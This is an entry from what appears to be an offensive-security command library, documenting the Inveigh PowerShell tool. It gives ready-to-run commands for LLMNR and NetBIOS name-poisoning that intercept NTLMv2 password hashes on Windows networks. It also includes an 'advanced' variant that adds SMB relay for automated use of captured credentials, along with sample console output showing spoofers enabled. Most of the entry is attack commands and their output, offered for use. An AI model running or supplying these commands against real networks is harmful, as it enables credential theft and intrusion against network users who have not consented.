---
id: c6161498-3bbd-4476-93ff-9b291539fcfc
name: Inveigh Intercept and Log NTLMv2 Hashes via LLMNR and NetBIOS Requests
type: command
executor: powershell
data: Invoke-Inveigh -LLMNR Y -NBNS Y -IP $_LISTEN_IP -ConsoleOutput Y
output: |-
  PS C:\ > Invoke-Inveigh -LLMNR Y -NBNS Y -IP 10.10.10.100 -ConsoleOutput Y
  [*] Inveigh 1.502 started at 2020-07-06T16:32:01
  WARNING: [!] Elevated Privilege Mode = Disabled
  [+] Primary IP Address = 10.10.10.100
  [+] Spoofer IP Address = 10.10.10.100
  [+] ADIDNS Spoofer = Disabled
  [+] DNS Spoofer = Enabled
  [+] DNS TTL = 30 Seconds
  [+] LLMNR Spoofer = Enabled
  [+] LLMNR TTL = 30 Seconds
  [+] mDNS Spoofer = Disabled
  [+] NBNS Spoofer For Types 00,20 = Enabled
  [+] NBNS TTL = 165 Seconds
  [+] SMB Capture = Disabled
  [+] HTTP Capture = Enabled
  [+] HTTPS Capture = Disabled
  [+] HTTP/HTTPS Authentication = NTLM
  [+] WPAD Authentication = NTLM
  [+] WPAD NTLM Authentication Ignore List = Firefox
  [+] WPAD Response = Enabled
  [+] Kerberos TGT Capture = Disabled
  [+] Machine Account Capture = Disabled
  [+] Console Output = Full
  [+] File Output = Disabled
  WARNING: [!] Run Stop-Inveigh to stop
  [*] Press any key to stop console output
created_at: '2020-07-06T23:40:45.742475+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Windows
tags:
  - ntlm
  - poisoning
verified: true
validated: true
---

# inveigh-intercept-ntlmv2-hashes-llmnr-nbns

## Command

```powershell
Invoke-Inveigh -LLMNR Y -NBNS Y -IP $_LISTEN_IP -ConsoleOutput Y
```

## Description

This command starts the Inveigh PowerShell tool to enable LLMNR and NBNS spoofing, binding to a specified IP address and outputting captures to the console. It is used to intercept NTLMv2 hashes in real-time during name resolution poisoning attacks on Windows networks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -LLMNR Y | Enables LLMNR (Link-Local Multicast Name Resolution) spoofing to poison multicast queries | Yes |
| -NBNS Y | Enables NBNS (NetBIOS Name Service) spoofing for broadcast name resolutions | Yes |
| -IP $_LISTEN_IP | Specifies the local IP address to bind the listener and spoof responses (e.g., attacker's IP on the network) | Yes |
| -ConsoleOutput Y | Enables full console logging for real-time visibility of requests and hash captures | Yes |

## Examples

### Basic Usage

```powershell
Invoke-Inveigh -LLMNR Y -NBNS Y -IP 10.10.10.100 -ConsoleOutput Y
```

Starts the listener on IP 10.10.10.100 with LLMNR/NBNS enabled and console output.

### Advanced Usage

```powershell
Invoke-Inveigh -LLMNR Y -NBNS Y -IP 10.10.10.100 -ConsoleOutput Y -FileOutput Y -SMBRelay
```

Adds file logging and enables SMB relay for automated exploitation of captured creds.

## Expected Output

Description of what output to expect when the command runs successfully.

```
PS C:\ > Invoke-Inveigh -LLMNR Y -NBNS Y -IP 10.10.10.100 -ConsoleOutput Y
[*] Inveigh 1.502 started at 2020-07-06T16:32:01
WARNING: [!] Elevated Privilege Mode = Disabled
[+] Primary IP Address = 10.10.10.100
[+] Spoofer IP Address = 10.10.10.100
[+] ADIDNS Spoofer = Disabled
[+] DNS Spoofer = Enabled
[+] DNS TTL = 30 Seconds
[+] LLMNR Spoofer = Enabled
[+] LLMNR TTL = 30 Seconds
[+] mDNS Spoofer = Disabled
[+] NBNS Spoofer For Types 00,20 = Enabled
[+] NBNS TTL = 165 Seconds
[+] SMB Capture = Disabled
[+] HTTP Capture = Enabled
[+] HTTPS Capture = Disabled
[+] HTTP/HTTPS Authentication = NTLM
[+] WPAD Authentication = NTLM
[+] WPAD NTLM Authentication Ignore List = Firefox
[+] WPAD Response = Enabled
[+] Kerberos TGT Capture = Disabled
[+] Machine Account Capture = Disabled
[+] Console Output = Full
[+] File Output = Disabled
WARNING: [!] Run Stop-Inveigh to stop
[*] Press any key to stop console output
```

Subsequent output includes lines like "[+] 10.10.10.50:445 (SMB) - Username::Domain:challenge:ntlmv2hash" when hashes are captured.

## Related

- [[procedures/Intercept-NTLMv2-Hashes-via-LLMNR-and-NetBIOS-Requests-Windows]]
- [[tools/Inveigh]]
